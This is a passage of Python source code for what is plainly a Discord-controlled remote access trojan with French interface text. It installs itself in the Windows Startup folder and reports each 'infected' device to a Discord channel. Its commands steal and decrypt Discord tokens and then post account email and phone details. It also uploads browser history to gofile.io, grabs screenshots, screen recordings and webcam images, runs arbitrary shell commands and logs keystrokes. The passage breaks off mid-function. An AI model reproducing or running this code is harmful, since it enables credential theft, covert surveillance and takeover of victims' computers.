
    in_startup = False

    if r"Microsoft\Windows\Start Menu\Programs\Startup" in sys.executable:
            on_ready_embed = discord.Embed(
                title="Un utilisateur est en ligne",
                description=f"**Nom de l'appareil :** {user}"
            )
            in_startup = True
    else:
        on_ready_embed = discord.Embed(
            title="Un appareil a été infecté !",
            description=f"**Nomde l'appareil :** {user}",
            
        )

    on_ready_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
    on_ready_embed.set_footer(
        text=f"Appareil surveillé : {user}"
    )


    exists = False

    for channel in GUILD.channels:
        if channel.name == os.getlogin().lower().replace(" ", "-"):
            exists = channel
            break
    
    if not exists:
        channel = await GUILD.create_text_channel(os.getlogin())
    else:
        channel = exists
        
    await channel.send("@everyone", embed=on_ready_embed)

    startup_path = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' 
    script_path = sys.executable
    rat_folder_path = f"C:/Users/{user}/UserSystem"

    try:
        if not os.path.exists(rat_folder_path):
            os.mkdir(rat_folder_path)
    except Exception as e:
        pass

    if  not in_startup:
        try:
            shutil.copy(script_path, startup_path)
            succes_added_to_sartup_embed = discord.Embed(
                title=f"Le programme a réussi à s'installer dans le dossier de démarrage.",
                description=f"Une copie du programme infécté est maintenant présente dans le dossier de démarage Windows de l'appareil de la victime.\n**Chemin du fichier d'origine :** ` {script_path} `\n**Chemin de la copie du programme infécté :** ` {startup_path} `\n\n**Dossier du RAT :** {rat_folder_path if os.path.exists(rat_folder_path) else ":x: Impossible de créer le dossier du RAT"}",
                color=discord.Color.green()
            )
    
            await channel.send(embed=succes_added_to_sartup_embed)

        except Exception as e:
            failed_to_add_to_sartup_embed = discord.Embed(
                title=f"ATTENTION : Le programme n'a pas réussi à s'installer dans le dossier de démarrage.",
                description=f" le dossier de démarage Windows de l'appareil de la victime.\n**Chemin du fichier d'origine :** ` {script_path} `",
                color=discord.Color.red()
            )

            await channel.send(embed=failed_to_add_to_sartup_embed)
    else:
        pass

@BOT.command()
async def wallpaper(ctx, path=None):
    if not isUser(ctx):
        return
    if path == None:
        await ctx.send(fr"> :x: **Veuillez préciser le chemin de l'image. ATTENTION :** uniquement sous format jpg, jpeg, ou png. **Exemple :** {BOT.command_prefix}wallpaper C:\Users\utilisateur\image.jpg")
        return

    if not os.path.exists(path):
        await ctx.send(fr"> :x: **Le chemin fournit n'exsite pas. ATTENTION :** uniquement sous format jpg, jpeg, ou png. **Exemple :** {BOT.command_prefix}wallpaper C:\Users\utilisateur\image.jpg")
        return

    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await ctx.send(f"> **Fond d'écran changé vers l'image située au chemin suivant :** {path}")
    except Exception as e:
        await ctx.send(f"> :x: **Erreur :** {e}")

@BOT.event
async def on_message(message):
    if message.content == BOT.user.mention:
        mention_embed = discord.Embed(
            title=f"Bonjour, je suis {BOT.user.name}",
            description=f"""
**:robot: Infos sur moi**

**Préfixe :** {BOT.command_prefix}
**Créateur :** NoonePYDEV
**Nombre de commandes :** 31

> Pour voir la liste de mes commandes, utilisez la commande **{BOT.command_prefix}help** !

**:globe_with_meridians: Pour plus d'infos sur mon créateur :**

**GunsLoL :** > **[ICI](https://guns.lol/NoonePYDEV)** <
**GitHub :** > **[ICI](https://github.com/NoonePYDEV)** <


"""
        )
        await message.channel.send(embed=mention_embed)
    await BOT.process_commands(message)
@BOT.hybrid_command()
async def ip(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        hostname = socket.gethostname()
        pc_ip = socket.gethostbyname(hostname)
        ip_embed = discord.Embed(
            title="Victim's IP found !",
            description=f"\nVictim's IP : {pc_ip}",
            
        )
        ip_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        ip_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=ip_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erreur lors de la récuparation de l'IP",
            description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur: `  {e}  `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def tokens(ctx):
    if not isUser(ctx):
        return
    def extr4ct_t0k3n5():
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        def decrypt_val(buff, master_key):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

        def get_master_key(path):
            if not os.path.exists(path):
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                local_state_path = appdata_roaming + f'\\{_d15c0rd}\\Local State'
                if not os.path.exists(local_state_path):
                    continue
                master_key = get_master_key(local_state_path)
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for enc_t0k3n in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(enc_t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                                t0k3n5.append(t0k3n)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                t0k3n5.append(t0k3n)

        return t0k3n5

    found = False
    tokens = extr4ct_t0k3n5()
    if tokens:
        unique_tokens = set(map(str.strip, tokens))  
        found = False

        for token_stolen in unique_tokens:
            headers = {"Authorization": token_stolen, "Content-Type": "application/json"}
            try:
                rsp = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

                if rsp.status_code == 200:
                    found = True
                    data = rsp.json()
                    avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png"
                    phone = data.get("phone", "Non lié")
                    verified = "✅ Oui" if data.get("verified") else "❌ Non"

                    embed = discord.Embed(
                        title=f"Token trouvé : {data.get("global_name", "Aucun")}",
                        description=f"""
    ━━━━━━━━━━━━━━━━━━━
    🆔 **ID :** `{data["id"]}`
    👤 **Pseudo :** `{data["username"]}`
    📩 **EMail :** {data.get("email", "Non lié")}
    📞 **Numéro de téléphone :** `{phone}`
    🌍 **Pays :** `{data.get("locale", "Inconnu")}`
    ✅ **Vérifié :** `{verified}`
    🔑 **Token :**  
    ```{token_stolen}```
    ━━━━━━━━━━━━━━━━━━━
                        """
                    )
                    embed.set_thumbnail(url=avatar_url)
                    await ctx.send(embed=embed)

            except Exception as e:
                await ctx.send(f"> :x: **Erreur :** {e}")

        if not found:
            await ctx.send("> ❌ **Aucun token valide trouvé**")

    else:
        await ctx.send("> ❌ **Aucun token trouvé**")


@BOT.hybrid_command()
async def history(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    chrome_hitory_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\History"
    edge_hitory_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\History"
    rat_folder_path = f"C:/Users/{user}/UserSystem"

    if os.path.exists(chrome_hitory_path):
        subprocess.run('cmd /c "TASKKILL /F /IM chrome.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
        try:
            conn = sqlite3.connect(f'file:{chrome_hitory_path}?mode=ro', uri=True)
            cursor = conn.cursor()

            request = "SELECT url, title, visit_count, last_visit_time FROM urls"
            cursor.execute(request)

            rows = cursor.fetchall()

            with open(f"{rat_folder_path}/Chrome.txt" if os.path.exists(rat_folder_path) else "./Chrome.txt", "w", encoding='utf-8') as history:
                history.write("""
                                              ___________________
        <====================================[HISTORIQUE : CHROME]====================================>  
                """)
                for row in rows:
                    url, title, visits_count, last_visit_time = row
                    history.write(f"""               
____________________________________________________________________________
    TITRE : {title}
    URL : {url} 
    NOMBRE DE VISITES : {visits_count} 
                    """)

        except Exception as e:
           error_embed = discord.Embed(
               title=":x: Erreur pour Chrome",
               description=f"Une erreur est survenue : {e}",
                color=discord.Color.red()
           )
           await ctx.send(embed=error_embed)

    if os.path.exists(edge_hitory_path):
        subprocess.run('cmd /c "TASKKILL /F /IM msedge.exe"', creationflags=subprocess.CREATE_NO_WINDOW)
        try:
            conn = sqlite3.connect(f'file:{edge_hitory_path}?mode=ro', uri=True)
            cursor = conn.cursor()

            request = "SELECT url, title, visit_count, last_visit_time FROM urls"
            cursor.execute(request)

            rows = cursor.fetchall()

            with open(f"{rat_folder_path}/Edge.txt" if os.path.exists(rat_folder_path) else "./Edge.txt", "w", encoding='utf-8') as history:
                history.write("""
                                              _________________
        <====================================[HISTORIQUE : EDGE]====================================>  
                """)
                for row in rows:
                    url, title, visits_count, last_visit_time = row
                    history.write(f"""               
____________________________________________________________________________
    TITRE : {title}
    URL : {url} 
    NOMBRE DE VISITES : {visits_count} 
                    """)

        except Exception as e:
            await ctx.send(f"> :x: **Erreur :** {e}")

    pathes = [f"{rat_folder_path}/Chrome.txt", f"{rat_folder_path}/Edge.txt"]

    for path in pathes:
        gofile_url = "https://store1.gofile.io/uploadFile"
        files = {'file': open(path, 'rb')}
        try:
            response = requests.post(gofile_url, files=files)
        except Exception as e:
            await ctx.send(f"> :x: Erreur :** {e}")
            return
        
        if response.status_code == 200:
            json_data = response.json()
            if json_data['status'] == 'ok':
                file_link = json_data["data"]["downloadPage"]
                history_embed = discord.Embed(
                    title=f"Historique volé ({path})",
                    description=f"**Lien vers les données :** {file_link}"
                )
                await ctx.send(embed=history_embed)
            else:
                pass
        else:
            await ctx.send(f"> :x: **Erreur :** {e}")
            return


@BOT.hybrid_command()
async def screen(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder_path = f"C:/Users/{user}/UserSystem"
    screen_screenshot_id = ''.join(random.choices("0123456789", k=4))
    
    if not os.path.exists(rat_folder_path):
        os.makedirs(rat_folder_path) 
    
    screenshot_path = f"{rat_folder_path}/screenshot_{screen_screenshot_id}.png"
    screen_screenshot = pyautogui.screenshot()
    screen_screenshot.save(screenshot_path)

    try:
        with open(screenshot_path, "rb") as screen:
            screen_file = discord.File(screen, filename=f"screenshot_{screen_screenshot_id}.png")
            
            screengrabb_embed = discord.Embed(
                title="Screen grabbed !",
                description=f"L'écran de l'appareil {user} a été capturé !",
            )
            screengrabb_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
            screengrabb_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=screengrabb_embed)
            await ctx.send(file=screen_file)

        os.remove(screenshot_path)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erreur lors de la capture de l'écran",
            description=f"Une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : `{e}`",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def screenrecord(ctx, duration: int):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder_path = f"C:/Users/{user}/UserSystem"
    screenrecord_id = ''.join(random.choices("0123456789", k=4))
    
    if not os.path.exists(rat_folder_path):
        os.makedirs(rat_folder_path) 
    
    video_path = f"{rat_folder_path}/screenrecord_{screenrecord_id}.mp4"
    
    screen_width, screen_height = pyautogui.size()
    
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_width, screen_height))
    
    start_time = time.time()
    
    recording_embed = discord.Embed(
        title="Enregistrement de l'écran en cours...",
        description=f"L'enregistrement de l'écran a commencé pour {user}."
    )
    recording_embed.set_thumbnail(url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png")
    recording_embed.set_footer(text=f"Appareil surveillé : {user}")
    
    await ctx.send(embed=recording_embed)
    
    try:
        while True:
            if time.time() - start_time > duration:
                break

            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()

        with open(video_path, 'rb') as f:
            response = requests.post("https://store1.gofile.io/uploadFile", files={"file": f})
            data = response.json()

        if data["status"] == "ok":
            file_url = data["data"]["downloadPage"]
            upload_message = f"Enregistrement terminé !\n🔗 **Lien du fichier** : {file_url}"
        else:
            upload_message = "❌ Erreur lors de l'upload sur Gofile."

        result_embed = discord.Embed(title=f"Fin de l'enregistrement {user}", description=upload_message)
        await ctx.send(embed=result_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erreur lors de l'enregistrement de l'écran",
            description=f"Une erreur est survenue lors de l'enregistrement de l'écran.\n\nErreur : `{e}`",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png")
        error_embed.set_footer(text=f"Appareil surveillé : {user}")
        
        await ctx.send(embed=error_embed)
        return
    
    try:
        os.remove(f"{rat_folder_path}/webcam_{screenrecord_id}.png" if os.path.exists(rat_folder_path) else f"./webcam_{screenrecord_id}.png")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de surpimmer le screenshot de la webcam :** {e}")

@BOT.hybrid_command()
async def webcam(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder_path = f"C:/Users/{user}/UserSystem"
    try:
        webcam_capture = cv2.VideoCapture(0)
        ret, frame = webcam_capture.read()
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de se connecter à la webcam :** {e}")
        return
    
    webcam_screenshot_id = ''.join(random.choices("0123456789", k=4))
    webcam_screenshot = cv2.imwrite(f"{rat_folder_path}/webcam_{webcam_screenshot_id}.png" if os.path.exists(rat_folder_path) else f"./webcam_{webcam_screenshot_id}.png", frame)

    with open(f"{rat_folder_path}/webcam_{webcam_screenshot_id}.png" if os.path.exists(rat_folder_path) else f"./webcam_{webcam_screenshot_id}.png", "rb") as webcam:
        
        try:
            webcam_file = discord.File(f"{rat_folder_path}/webcam_{webcam_screenshot_id}.png" if os.path.exists(rat_folder_path) else f"./webcam_{webcam_screenshot_id}.png", filename=f"webcam_{webcam_screenshot_id}.png")
            webcamgrabb_embed = discord.Embed(
                title="Webcam Grabbed !",
                description=f"\nLa webcam de l'appareil {user} à été catpturée !",
                
            )
            webcamgrabb_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
            webcamgrabb_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=webcamgrabb_embed)
            await ctx.send(file=webcam_file)

        except Exception as e:
            error_embed = discord.Embed(
                title="❌ Erreur lors de la capture de la webcam",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
            error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
            error_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=error_embed)
            return
        
    try:
        os.remove(f"{rat_folder_path}/webcam_{webcam_screenshot_id}.png" if os.path.exists(rat_folder_path) else f"./webcam_{webcam_screenshot_id}.png")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de surpimmer le screenshot de la webcam :** {e}")

@BOT.hybrid_command()
async def system(ctx):
    if not isUser(ctx):
        return
    try:
        try:
            hostname = socket.gethostname()
        except:
            pass
        try:
            pc_ip = socket.gethostbyname(hostname)
        except:
            pc_ip = "Une erreur est survenue lors de la récupération"
        try:
            pc_name = os.getlogin()
        except:
            pc_name = "Une erreur est survenue lors de la récupération"
        try:
            pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors='ignore').splitlines()[2].strip()
        except:
            pc_gpu = "Une erreur est survenue lors de la récupération"
        try:
            pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]
        except:
            pc_cpu = "Une erreur est survenue lors de la récupération"
        try:
            pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        except:
            pc_ram = "Une erreur est survenue lors de la récupération"
        try:
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        except:
            mac_address = "Une erreur est survenue lors de la récupération"
        try:
            pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8').split('\n')[1].strip()
        except:
            pc_uuid = "Une erreur est survenue lors de la récupération"

        system_embed = discord.Embed(
            title="Victim's system infos",
            description=f"IP : ` {pc_ip} `\nUser : ` {pc_name} `\nGPU : ` {pc_gpu} `\nCPU : ` {pc_cpu} `\nRAM : ` {pc_ram} `\nAdresse MAC : ` {mac_address} `\nUUID : ` {pc_uuid} `\n",
            
        )

        system_embed.set_thumbnail(
                    url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
                )
        system_embed.set_footer(text=f"Appareil surveillé : {pc_name}")

        await ctx.send(embed=system_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title="❌ Erreur lors de la récupération des informations système",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {pc_name}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def restart(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        subprocess.run('cmd /c "shutodwn /r /t 0"', creationflags=subprocess.CREATE_NO_WINDOW)
        successfully_restarted_embed = discord.Embed(
            title="Appareil redémarré",
            description=f"L'appareil ` {user} ` a bien été redémarré",
            color=discord.Color.green()
        )

        await ctx.send(embed=successfully_restarted_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Une erreur est survenue",
            description=f"Une erreur est survenue lors de l'execution de la commande.\n\n**Détails :** {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def filepath(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    path = sys.executable
    startup = "Non"
    startup_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{os.path.basename(sys.executable)}"
    if os.path.exists(startup_path):
        startup = "Oui"

    path_embed = discord.Embed(
        title="Chemin du fichier infecté",
        description=f"**Chemin du fichier actuellement en cours d'utilisation :** {path}\n\n**Présent dans le dossier de démarrage :** {startup}",
        
    )

    await ctx.send(embed=path_embed)

@BOT.hybrid_command()
async def notify(ctx, *, content: str = None):
    if not isUser(ctx):
        return
    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description=f'''Format incorrect ! Utilisez : {BOT.command_prefix}notify \"Nom de l'app | Titre | Message\"''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return
    try:

        app_name, notification_title, notification_message = map(str.strip, content.split("|", 1))

        notif = Notification(app_id=app_name, title=notification_title, msg=notification_message)
        notif.show()

        send_valid_embed = discord.Embed(
            title=f"La notification a bien été envoyée à l'appareil  {user} ",
            description=f"Title :  {notification_title} \nNotification message :  {notification_message} ",
            color=discord.Color.green()
        )

        send_valid_embed.set_thumbnail(
                    url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
                )
        send_valid_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=send_valid_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de l'envoie de la notification",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur :    {e}   ",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def error(ctx, *, content: str=None):
    if not isUser(ctx):
        return
    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
            title=":x: Mauvaise syntaxe de commande !",
            description=f'''Format incorrect ! Utilisez : {BOT.command_prefix}error "Titre | Message"''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    error_title, error_message = map(str.strip, content.split("|", 1))

    def show():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        messagebox.showerror(title=error_title, message=error_message)
        root.destroy()

    try:
        threading.Thread(target=show).start()

        send_valid_embed = discord.Embed(
            title=f"L'erreur a bien été envoyée à l'appareil {user}",
            description=f"Title : {error_title}\nNotification message : {error_message}",
            color=discord.Color.green()
        )

        await ctx.send(embed=send_valid_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Erreur lors de l'affichage de l'erreur",
            description=f"Une erreur est survenue : {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def msgbox(ctx, *, content: str=None):
    if not isUser(ctx):
        return
    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
            title=":x: Mauvaise syntaxe de commande !",
            description=f'''Format incorrect ! Utilisez : {BOT.command_prefix}msgbox "Titre | Message"''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    error_title, error_message = map(str.strip, content.split("|", 1))


    def show():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        messagebox.showinfo(title=error_title, message=error_message)
        root.destroy()

    try:
        threading.Thread(target=show).start()

        send_valid_embed = discord.Embed(
            title=f"Le message a bien été envoyé à l'appareil {user}",
            description=f"Title : {error_title}\nNotification message : {error_message}",
            color=discord.Color.green()
        )

        await ctx.send(embed=send_valid_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Erreur lors de l'affichage du message",
            description=f"Une erreur est survenue : {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def warning(ctx, *, content: str=None):
    if not isUser(ctx):
        return
    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
            title=":x: Mauvaise syntaxe de commande !",
            description=f'''Format incorrect ! Utilisez : {BOT.command_pefix}warning "Titre | Message"''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    error_title, error_message = map(str.strip, content.split("|", 1))


    def show():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        messagebox.showwarning(title=error_title, message=error_message)
        root.destroy()

    try:

        threading.Thread(target=show).start()

        send_valid_embed = discord.Embed(
            title=f"L'avertissement a bien été envoyé à l'appareil {user}",
            description=f"Title : {error_title}\nNotification message : {error_message}",
            color=discord.Color.green()
        )

        await ctx.send(embed=send_valid_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Erreur lors de l'affichage de l'avertissement",
            description=f"Une erreur est survenue : {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def dir(ctx, path):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"  
    try:
        cmd = subprocess.run(f'cmd /c "dir {path}"', capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        await ctx.send(f"> :x: **Une erreur est survenue :** {path}")
        return
    
    if len(cmd.stdout) > 4000:
        await ctx.send("> **Envoi du résultat de la commande sous forme de fichier texte : le résultat de la commande dépasse la limite de caractères autorisée par Discord**")

        try:
            if not os.path.exists(rat_folder):
                os.makedirs(rat_folder)

            file_path = os.path.join(rat_folder, "dir.txt")  
            
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(cmd.stdout)

            with open(file_path, "rb") as file:
                dirfile = discord.File(file, filename="dir.txt")

            await ctx.send(file=dirfile)
            return
        
        except Exception as e:
            await ctx.send(f"> :x: **Une erreur est survenue :** {e}")
            return
        
    dir_embed = discord.Embed(
        title="Commande exécutée",
        description=f"**Résultat :**\n```{cmd.stdout}```"
    )
    await ctx.send(embed=dir_embed)


@BOT.hybrid_command()
async def exe(ctx, *, command: str=None):
    if not isUser(ctx):
        return
    user = os.getlogin()
    noconsole = False
    if command.startswith("noconsole"):
        noconsole = True
        command = command.replace("noconsole ", "")

    try:
        await ctx.send("> **Execution de la commande...**")
        subprocess.run(f'cmd /c "{command}"') if noconsole == False else subprocess.run(f'cmd /c "{command}"', creationflags=subprocess.CREATE_NO_WINDOW)
        success_execution_embed = discord.Embed(
            title=f"La commande à été executée sur l'appareil  {user} ",
            description=f"Commande :  {command} \nSans console : {"Oui" if noconsole == True else "Non"}",
            color=discord.Color.green()
        )
        success_execution_embed.set_thumbnail(
            url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
        )
        success_execution_embed.set_footer(
            text=f"Appareil surveillé : {user}"
        )

        await ctx.send(embed=success_execution_embed)
    except Exception as e:
        error_embed = discord.Embed(
                title=f"❌ Erreur lors de l'execution de la commande sur l'appareil  {user} ",
                description=f"une erreur est survenue lors de l'execution de la commande, veuillez réessayer plus tard.\n\nErreur :    {e}   ",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def keylogger(ctx, *, keystrokes_number: int):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"
    keylog_file = f"{rat_folder}/keylogger_file.txt" if os.path.exists(rat_folder) else "./keylogger_file.txt"

    try:
        with open(keylog_file, "w") as file:
            file.write("<===========[ KEYLOGGER LOGS ]===========> \n \n")

        timer = 0
        keylogs = ""

        async def listen_keys():
            nonlocal timer, keylogs

            while True:
                event = await asyncio.to_thread(keyboard.read_event) 
                if event.event_type == keyboard.KEY_DOWN:
                    pressed_key = event.name
                    timer += 1
                    keylogs += pressed_key

                    if pressed_key == "space":
                        pressed_key = " "
                    elif pressed_key == "enter":
                        pressed_key = "\n"
                    elif pressed_key == "tab":
                        pressed_key = "\t"
                    elif pressed_key == "shift":
                        pressed_key = " [shift] "
                    elif pressed_key == "ctrl":
                        pressed_key = " [ctrl] "
                    elif pressed_key == "alt":
                        pressed_key = " [alt] "
                    elif pressed_key == "esc":
                        pressed_key = " [esc] "
                    elif pressed_key == "backspace":
                        pressed_key = " [backspace] "
                    elif pressed_key == "delete":
                        pressed_key = " [delete] "
                    elif pressed_key == "insert":
                        pressed_key = " [insert] "
                    elif pressed_key == "home":
                        pressed_key = " [home] "
                    elif pressed_key == "end":
                        pressed_key = " [end] "
                    elif pressed_key == "page up":
                        pressed_key = " [page up] "
                    elif pressed_key == "page down":
                        pressed_key = " [page down] "
                    elif pressed_key == "caps lock":
                        pressed_key = " [caps lock] "
                    elif pressed_key == "num lock":
                        pressed_key = " [num lock] "
                    elif pressed_key == "scroll lock":
                        pressed_key = " [scroll lock] "
                    elif pressed_key == "left arrow":
                        pressed_key = " [left arrow] "
                    elif pressed_key == "right arrow":
                        pressed_key = " [right arrow] "
                    elif pressed_key == "up arrow":
                        pressed_key = " [up arrow] "
                    elif pressed_key == "down arrow":
                        pressed_key = " [down arrow] "
                    elif pressed_key == "verr.maj":
                        pressed_key = ""
                    elif pressed_key.startswith("f"):
                        pressed_key = f" [{pressed_key}] "

                    with open(keylog_file, "a") as file:
                        file.write(pressed_key)

                    if timer == keystrokes_number:
                        timer = 0
                        with open(keylog_file, "r") as file:
                            logs = file.read()
                            keylogs_embed = discord.Embed(
                                title=f"Logs de frappes de l'appareil `{user}`",
                                description=logs,
                            )
                        await ctx.send(embed=keylogs_embed)
                        
                        with open(keylog_file, "w") as file:
                            pass
                        return

        await ctx.send(f"> **Démarrage de l'écoute des frappes sur l'appareil `{user}`...**")
        await listen_keys()

    except Exception as e:
        error_embed = discord.Embed(
            title=f"❌ Erreur lors du lancement du keylogger sur l'appareil `{user}`",
